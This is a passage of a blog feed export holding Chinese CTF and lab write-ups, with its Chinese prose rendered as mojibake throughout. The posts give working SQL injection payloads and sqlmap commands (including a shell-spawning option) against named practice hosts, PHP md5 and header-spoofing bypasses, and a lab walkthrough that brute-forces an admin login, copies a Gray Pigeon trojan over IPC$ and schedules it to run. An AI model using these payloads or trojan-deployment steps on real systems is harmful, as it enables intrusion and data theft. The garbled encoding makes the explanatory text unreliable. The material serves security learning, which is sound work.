($_GET[<span class="hljs-string">'nctf'</span>], <span class="hljs-string">'#biubiubiu'</span>) !== <span class="hljs-keyword">FALSE</span>)              <span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);       <span class="hljs-keyword">else</span>           <span class="hljs-keyword">echo</span> <span class="hljs-string">'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'</span>;   &#125;</code></pre></div><p>è¯•äº†è¯•<code>?nctf[]=1</code>,å‡ºç°äº†æŠ¥é”™ä½†æ˜¯ç­”æ¡ˆçœŸå°±å‡ºæ¥äº†</p><p>æ­£å„¿å…«ç»çš„åšæ³•æ˜¯<code>?nctf=1%00%23biubiubiu</code>ï¼Œç®€å•çš„ä»£ç å®¡è®¡</p><h2 id="bypass-again"><a href="#bypass-again" class="headerlink" title="bypass again"></a>bypass again</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'a'</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'b'</span>]))&#123;<span class="hljs-keyword">if</span> ($_GET[<span class="hljs-string">'a'</span>] != $_GET[<span class="hljs-string">'b'</span>])<span class="hljs-keyword">if</span> (md5($_GET[<span class="hljs-string">'a'</span>]) == md5($_GET[<span class="hljs-string">'b'</span>]))<span class="hljs-keyword">die</span>(<span class="hljs-string">'Flag: '</span>.$flag);<span class="hljs-keyword">else</span><span class="hljs-keyword">print</span> <span class="hljs-string">'Wrong.'</span>;&#125; <span class="hljs-meta">?&gt;</span></code></pre></div><p>ä»£ç å®¡è®¡ï¼Œgetæ–¹å¼ä¼ é€’å‚æ•°aå’Œb,äºŒè€…çš„å€¼ä¸åŒï¼Œä½†æ˜¯md5å€¼ä¸åŒï¼Œæ­¤å¤„åˆåˆ©ç”¨md5()æ¼æ´</p><p> <strong>åœ¨PHPä¸­ï¼ŒMD5æ˜¯ä¸èƒ½å¤„ç†æ•°ç»„çš„ï¼Œmd5(æ•°ç»„)ä¼šè¿”å›nullï¼Œæ‰€ä»¥md5(a[])null,md5(b[])nullï¼Œmd5(a[])=md5(b[])=null,è¿™æ ·å°±å¾—åˆ°ç­”æ¡ˆäº†ã€‚</strong> </p><p>payload:</p><p> <code>http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3</code> </p><h2 id="ä¼ªè£…è€…"><a href="#ä¼ªè£…è€…" class="headerlink" title="ä¼ªè£…è€…"></a>ä¼ªè£…è€…</h2><p>bpæŠ“åŒ…ï¼Œæ·»åŠ <code>X-Forwarded-For=127.0.0.1</code>,å‘åŒ…å³å¯</p><p> <strong>X-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ</strong> </p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>md5</tag>
      
      <tag>sql</tag>
      
      <tag>ä»£ç å®¡è®¡</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2020/08/16/SSTI/"/>
    <url>/2020/08/16/SSTI/</url>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2020/11/30/LAJfgePG7qsKph4.png" srcset="/img/loading.gif" alt><br><code>https://www.cnblogs.com/wangtanzhi/p/12238779.html</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>STTI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku</title>
    <link href="/2020/08/08/Bugku/"/>
    <url>/2020/08/08/Bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="Bugkuåˆ·é¢˜"><a href="#Bugkuåˆ·é¢˜" class="headerlink" title="Bugkuåˆ·é¢˜"></a>Bugkuåˆ·é¢˜</h1><a id="more"></a><h2 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h2><div class="hljs"><pre><code class="hljs html">1' and 1=1 #        1' and 1=2 #</code></pre></div><p>   ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹</p><h2 id="æ‰‹å·¥æ³¨å…¥"><a href="#æ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ‰‹å·¥æ³¨å…¥"></a>æ‰‹å·¥æ³¨å…¥</h2><h3 id="1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"><a href="#1-1-39-order-by-4-å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ" class="headerlink" title="1.1&#39; order by 4#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ"></a>1.<code>1&#39; order by 4</code>#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ</h3><h3 id="2-çˆ†æ•°æ®åº“"><a href="#2-çˆ†æ•°æ®åº“" class="headerlink" title="2.çˆ†æ•°æ®åº“"></a>2.çˆ†æ•°æ®åº“</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`  database:skctf_flag</code></pre></div><h3 id="3-çˆ†å‡ºè¡¨å"><a href="#3-çˆ†å‡ºè¡¨å" class="headerlink" title="3.çˆ†å‡ºè¡¨å"></a>3.çˆ†å‡ºè¡¨å</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p><h3 id="4-å­—æ®µå"><a href="#4-å­—æ®µå" class="headerlink" title="4.å­—æ®µå"></a>4.å­—æ®µå</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p><p> å¾—åˆ°flag</p><p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>å› ä¸ºæœ¬é¢˜æäº¤æ•°æ®çš„æ–¹å¼ä¸ºpostï¼Œæ•…éœ€è¦å…ˆç”¨bpæŠ“æ•°æ®åŒ…ï¼Œä¿å­˜åˆ°sqlmapçš„è·¯å¾„ä¸­</strong></p><p><img src="/2020/08/08/Bugku/cjd1.png" srcset="/img/loading.gif" alt></p><h3 id="1-è·å–æ•°æ®åº“"><a href="#1-è·å–æ•°æ®åº“" class="headerlink" title="1.è·å–æ•°æ®åº“"></a>1.è·å–æ•°æ®åº“</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre></div><p><img src="/2020/08/08/Bugku/cjd2.png" srcset="/img/loading.gif" alt></p><h3 id="2-è·å–è¡¨å"><a href="#2-è·å–è¡¨å" class="headerlink" title="2.è·å–è¡¨å"></a>2.è·å–è¡¨å</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre></div><p><img src="/2020/08/08/Bugku/cjd3.png" srcset="/img/loading.gif" alt></p><h3 id="3-è·å–åˆ—å"><a href="#3-è·å–åˆ—å" class="headerlink" title="3.è·å–åˆ—å"></a>3.è·å–åˆ—å</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre></div><p><img src="/2020/08/08/Bugku/cjd4.png" srcset="/img/loading.gif" alt></p><h3 id="4-è·å–flag"><a href="#4-è·å–flag" class="headerlink" title="4.è·å–flag"></a>4.è·å–flag</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre></div><p><img src="/2020/08/08/Bugku/cjd5.png" srcset="/img/loading.gif" alt></p><hr><h2 id="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"><a href="#å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯" class="headerlink" title="å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯"></a>å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯</h2><p> æ‰«æå‘ç°äº†index.phpï¼Œé€šè¿‡  index.php.bakä¸‹è½½ç½‘é¡µæºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * Created by PhpStorm.</span><span class="hljs-comment"> * User: Norse</span><span class="hljs-comment"> * Date: 2017/8/6</span><span class="hljs-comment"> * Time: 20:22</span><span class="hljs-comment">*/</span><span class="hljs-keyword">include_once</span> <span class="hljs-string">"flag.php"</span>;ini_set(<span class="hljs-string">"display_errors"</span>, <span class="hljs-number">0</span>);$str = strstr($_SERVER[<span class="hljs-string">'REQUEST_URI'</span>], <span class="hljs-string">'?'</span>);$str = substr($str,<span class="hljs-number">1</span>);$str = str_replace(<span class="hljs-string">'key'</span>,<span class="hljs-string">''</span>,$str);parse_str($str);<span class="hljs-keyword">echo</span> md5($key1);<span class="hljs-keyword">echo</span> md5($key2);<span class="hljs-keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;<span class="hljs-keyword">echo</span> $flag.<span class="hljs-string">"å–å¾—flag"</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p> å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡</p><p> 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p><p> 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´</p><p> å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚</p><p> ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š</p><div class="hljs"><pre><code>QNKCDZO240610708s878926199as155964671as214587387as214587387a</code></pre></div><hr><h2 id="å¤šæ¬¡"><a href="#å¤šæ¬¡" class="headerlink" title="å¤šæ¬¡"></a>å¤šæ¬¡</h2><p>çˆ†æ•°æ®åº“å</p><p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p><p>database:<strong>web1002-1</strong></p><p>çˆ†è¡¨å</p><div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre></div><p>flag1,hint</p><p>çˆ†å­—æ®µå</p><div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre></div><p>flag1,address<br>è·å–å†…å®¹</p><div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre></div><p><strong>usOwycTju+FTUUzXosjr</strong></p><p>æäº¤å‘ç°ä¸å¯¹</p><div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre></div><p>è·å–addressä¸­çš„å†…å®¹</p><p>./Once_More.php<br>ä¸‹ä¸€å…³åœ°å€<br>å¾—åˆ°å¦å¤–ä¸€ä¸ªåœ°å€</p><div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre></div><p>ç»™å‡ºæç¤º<br>XPATH syntax error: â€˜<del>class,flag2</del>â€˜</p><div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre></div><p>Unknown column â€˜flag2â€™ in â€˜where clauseâ€™</p><div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre></div><p>XPATH syntax error: â€˜<del>flag{Bugku-sql_6s-2i-4t-bug}</del>â€˜</p><p><strong>ï¼ï¼ï¼æ³¨æ„æŠŠflagæ”¹ä¸ºå°å†™å­—æ¯</strong></p><hr><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>é¶åœºï¼š<a href="é¶åœºï¼šhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p><h3 id="ä¸€ã€æ‰‹å·¥æ³¨å…¥"><a href="#ä¸€ã€æ‰‹å·¥æ³¨å…¥" class="headerlink" title="ä¸€ã€æ‰‹å·¥æ³¨å…¥"></a>ä¸€ã€æ‰‹å·¥æ³¨å…¥</h3><p>ç¬¬ä¸€æ­¥</p><div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre></div><p>åŠ å•å¼•å·æŠ¥é”™</p><div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre></div><p>æŸ¥çœ‹æ‰€æœ‰çš„è¡¨</p><div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre></div><p>æŸ¥çœ‹è¡¨ä¸­çš„åˆ—</p><div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre></div><p>0x637466 ä¸ºåå…­è¿›åˆ¶ctf</p><p>è·å–å­—æ®µå†…å®¹</p><div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre></div><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p><h3 id="äºŒã€sqlmapæ³¨å…¥"><a href="#äºŒã€sqlmapæ³¨å…¥" class="headerlink" title="äºŒã€sqlmapæ³¨å…¥"></a>äºŒã€sqlmapæ³¨å…¥</h3><p>æ£€æµ‹æ˜¯å¦æœ‰æ³¨å…¥ç‚¹</p><p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>æ²¡æœ‰æˆåŠŸ<br>ä½¿ç”¨åå…­è¿›åˆ¶</p><div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre></div><p>è·å–æ•°æ®åº“å</p><div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --dbs //é€‰æ‹©åå…­è¿›åˆ¶ è·å–æ•°æ®åº“å å•å¼•å·ä½¿ç”¨urlç¼–ç </code></pre></div><p>è·å–è¡¨å</p><div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre></div><p>è·å–flag</p><div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre></div><p><img src="/2020/08/08/Bugku/k1.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æœ¨é©¬</title>
    <link href="/2020/07/18/%E6%9C%A8%E9%A9%AC/"/>
    <url>/2020/07/18/%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="åˆè¯†æœ¨é©¬"><a href="#åˆè¯†æœ¨é©¬" class="headerlink" title="åˆè¯†æœ¨é©¬"></a>åˆè¯†æœ¨é©¬</h1><a id="more"></a><h2 id="å®éªŒç›®çš„"><a href="#å®éªŒç›®çš„" class="headerlink" title="å®éªŒç›®çš„"></a>å®éªŒç›®çš„</h2><p><strong>ä½¿ç”¨ç°é¸½å­è½¯ä»¶ä»¥åŠç«¯å£çˆ†ç ´è½¯ä»¶æ§åˆ¶ç›®çš„ä¸»æœº</strong></p><p>å‡†å¤‡ä¸€å°xpï¼Œä¸€å°2003<br>å…¶ä¸­xpåœ°å€ä¸º10.1.1.3/24 2003ä¸º10.1.1.1/24<br>ä½¿ä¸¤ä¸ªä¸»æœºèƒ½å¤Ÿé€šä¿¡<br>xpä½œä¸ºæ”»å‡»æ–¹ï¼Œ2003ä¸ºå—å®³è€…</p><h3 id="1-åˆ¶ä½œæœ¨é©¬"><a href="#1-åˆ¶ä½œæœ¨é©¬" class="headerlink" title="1.åˆ¶ä½œæœ¨é©¬"></a>1.åˆ¶ä½œæœ¨é©¬</h3><p>ä½¿ç”¨ç°é¸½å­åˆ¶ä½œæœ¨é©¬ï¼Œå°†æœ¨é©¬ç”Ÿæˆåœ¨åœ¨æ¡Œé¢ï¼ˆè®°ä½è·¯å¾„ä¹‹åè¦ä½¿ç”¨ï¼‰<br><img src="https://i.loli.net/2020/11/30/xci7NTtIXgeODkz.png" srcset="/img/loading.gif" alt><br><img src="https://i.loli.net/2020/11/30/H38gByNiumIE1t7.png" srcset="/img/loading.gif" alt></p><h3 id="2-æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´"><a href="#2-æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´" class="headerlink" title="2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´"></a>2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´</h3><p>ipèµ·å§‹åœ°å€ä¸º10.1.1.1-10.1.1.255<br>å¯†ç é…ç½®æ–‡ä»¶<br><img src="https://i.loli.net/2020/11/30/8gSyYGJxjvqTaDR.png" srcset="/img/loading.gif" alt><br>å…¶å®åªè¦æ‰«æ10.1.1.1å³å¯ï¼ˆå› ä¸ºæ˜¯å®éªŒï¼‰</p><p>è·å–è´¦å·å¯†ç <br>usernameï¼šadministrator<br>password: â€œâ€</p><h3 id="3-ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC"><a href="#3-ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC" class="headerlink" title="3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$"></a>3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$</h3><p><code>net use \\10.1.1.1\ipc$ &quot;&quot; \user:administrator</code></p><h3 id="4-æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº"><a href="#4-æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº" class="headerlink" title="4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº"></a>4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœº</h3><p><code>copy C:\Documents and Settings\shimisi\æ¡Œé¢\qq.exe  \\10.1.1.1\ipc$</code></p><h3 id="5-è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬"><a href="#5-è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬" class="headerlink" title="5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬"></a>5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬</h3><p><code>net time \\10.1.1.1</code>æ ¹æ®ç›®æ ‡ä¸»æœºæ—¶é—´è®¾ç½®äº‹ç‰©çš„å¼€å§‹æ—¶é—´<br><code>at \\10.1.1.1 17:17 c:\qq.exe</code>åœ¨ä¸Šé¢çš„æ—¶é—´ä¹‹åä¸‰åˆ†é’Ÿå·¦å³è®¾ç½®ä¸€ä¸ªäº‹ç‰©<br>å³åœ¨17ï¼š17æ—¶è¿è¡Œæœ¨é©¬æ–‡ä»¶</p><h3 id="6-æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº"><a href="#6-æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº" class="headerlink" title="6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº"></a>6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœº</h3><p>è§‚å¯Ÿç›®æ ‡ä¸»æœºå·²è‡ªåŠ¨ä¸Šçº¿ï¼Œå·²å¯ä»¥è¿›è¡Œç›‘æ§æˆ–ä¼ è¾“æ•°æ®ç­‰æ“ä½œ</p><p>è·å–å±å¹•å†…å®¹<br><img src="https://i.loli.net/2020/11/30/1Mow9ZpJxznAFRS.png" srcset="/img/loading.gif" alt></p><p>æ§åˆ¶å‘½ä»¤è¡Œ<br><img src="https://i.loli.net/2020/11/30/nKMgSveqLyYr4aJ.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>æœ¨é©¬</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jdtest</title>
    <link href="/2020/07/18/jdtest/"/>
    <url>/2020/07/18/jdtest/</url>
    
    <content type="html"><![CDATA[<h1 id="çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•"><a href="#çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•" class="headerlink" title="çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•"></a>çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•</h1><a id="more"></a><p>è®¿é—®çš„é¡µé¢<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>å›¾ç‰‡é“¾æ¥çš„ä½ç½®<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/7/16 14:54</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : jd.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> osdir = <span class="hljs-string">"jdtp"</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):    os.mkdir(dir)baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>head = &#123;        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>    &#125;response = requests.get(url=baseurl, headers = head)<span class="hljs-comment">#print(response.text)</span>html = response.textfindlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span><span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>urls = re.findall(findlinks, html)<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:    time.sleep(<span class="hljs-number">1</span>)    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:        f.write(res.content)</code></pre></div>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2020/07/18/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2020/07/18/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmapä½¿ç”¨"><a href="#sqlmapä½¿ç”¨" class="headerlink" title="sqlmapä½¿ç”¨"></a>sqlmapä½¿ç”¨</h1><a id="more"></a><p>ç¬¬ä¸€æ­¥:</p><div class="hljs"><pre><code>-u &quot;xxâ€ --cookie= &quot;yyy&quot; //å¸¦ä¸Šcookieå¯¹URLè¿›è¡Œæ³¨å…¥æ¢æµ‹</code></pre></div><p>ç¬¬äºŒæ­¥:</p><div class="hljs"><pre><code>-u &quot;xxxâ€ --cookie= &quot;yy&quot; - current--db //å¯¹æ•°æ®åº“åè¿›è¡Œè·å–</code></pre></div><p>ç¬¬ä¸‰æ­¥:</p><div class="hljs"><pre><code>-u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //å¯¹æ•°æ®åº“dvwaçš„è¡¨åè¿›è¡Œæšä¸¾</code></pre></div><p>ç¬¬å››æ­¥:</p><div class="hljs"><pre><code>-u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //å¯¹dvwaåº“é‡Œé¢çš„åä¸ºusersè¡¨çš„åˆ—åè¿›è¡Œæšä¸¾</code></pre></div><p>ç¬¬äº”æ­¥:</p><div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump//æ¢æµ‹userè¡¨nameå’Œpasswordå­—æ®µ</code></pre></div><p>å¦‚æœæ­¤æ—¶å¾—åˆ°çš„å¯†ç ä¸ºå¯†æ–‡, SQLmapä¼šè‡ªåŠ¨è¯¢é—®ï¼Œæ˜¯å¦çˆ†ç ´,é€‰æ‹©â€æ˜¯â€å³å¯å¼€å§‹ä½¿ç”¨SQLMAPè‡ªå¸¦çš„å­—<br>å…¸è¿›è¡Œçˆ†ç ´ã€‚</p><p>ç¬¬å…­æ­¥:</p><div class="hljs"><pre><code>-u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //è·å–shell,é€‰æ‹©åå°è¯­è¨€</code></pre></div><h1 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h1><p>order by * </p><p>group by *</p><p>åˆ©ç”¨å†…ç½®å‡½æ•°æš´æ•°æ®åº“ä¿¡æ¯</p><p>version() æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬</p><p>database() æŸ¥çœ‹å½“å‰æ•°æ®åº“å</p><p>user() æŸ¥çœ‹å½“å‰ç”¨æˆ·</p><p>æŸ¥çœ‹è¡¨ï¼š</p><div class="hljs"><pre><code>Select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()  </code></pre></div><p>å¯åå…­è¿›åˆ¶æŸ¥çœ‹å­—æ®µï¼š</p><div class="hljs"><pre><code>select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=â€˜biaomingâ€™;</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çˆ¬å›¾</title>
    <link href="/2020/07/18/%E7%88%AC%E5%9B%BE/"/>
    <url>/2020/07/18/%E7%88%AC%E5%9B%BE/</url>
    
